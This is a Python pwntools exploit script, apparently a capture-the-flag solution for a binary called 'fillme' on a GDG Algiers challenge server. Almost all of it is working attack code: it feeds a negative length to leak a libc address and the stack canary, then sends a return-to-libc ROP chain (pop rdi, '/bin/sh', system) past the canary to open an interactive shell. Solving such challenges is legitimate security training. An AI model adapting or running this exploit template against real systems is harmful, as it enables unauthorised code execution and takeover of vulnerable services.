# python2
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './fillme'
HOST = 'pwn.chal.ctf.gdgalgiers.com'
PORT = 1403
#HOST = '172.17.0.3'
#PORT = 1337

def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
	debug(r, [])

s= 0x50
t= -(0x100-s)
r.sendlineafter(': ', str(t).encode())
r.sendafter(': ', b'a'*s)
r.recvuntil(b'a' * s)
leak = u64(r.recvuntil('\n', True).ljust(8, b'\x00'))
dbg('leak')
base = leak + 0xc1410
dbg('base')
system = base + 0x4a4e0
binsh = base + 0x1b1117
rdi = base + 0x0014e707
r.sendlineafter('y/n] ', b'y')

r.sendlineafter('Choice: ', b'1')
s= 0x59
t= -(0x100-s)
r.sendlineafter(': ', str(t).encode())
r.sendafter(': ', b'a'*s)
r.recvuntil(b'a' * s)
canary = u64(r.recvuntil('\n', True).rjust(8, b'\x00'))
dbg('canary')
r.sendlineafter('y/n] ', b'n')
r.sendafter(': ', b'a'*0x58+b'\x00')
r.sendlineafter('y/n] ', b'y')

r.sendlineafter('Choice: ', b'1')
s= 0xf0
t= -(0x100-s)
r.sendlineafter(': ', str(t).encode())
#payload = flat(1,2,3,4,5,6,7,8,9,11,12, 13, 14,15,16,17,18,19)
payload = flat(1,2,3,4,5,6,7,rdi,binsh,system,12, 13, 14,15,16,17,18,19)
r.sendafter(': ', b'a'*0x58+p64(canary)+payload)
r.sendlineafter('y/n] ', b'y')

r.interactive()
r.close()
